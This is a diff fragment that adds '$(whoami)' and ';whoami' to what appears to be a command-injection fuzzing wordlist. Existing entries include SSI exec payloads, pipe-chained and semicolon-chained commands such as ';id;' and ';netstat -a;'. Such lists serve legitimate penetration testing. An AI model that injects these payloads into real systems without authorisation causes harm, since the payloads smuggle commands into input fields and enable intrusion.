@@ -40,6 +40,8 @@ If it is considered unavoidable to incorporate user-supplied data into operating
 &lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
 &lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
 /index.html|id|
+$(whoami)
+;whoami
 ;id;
 ;id
 ;netstat -a;
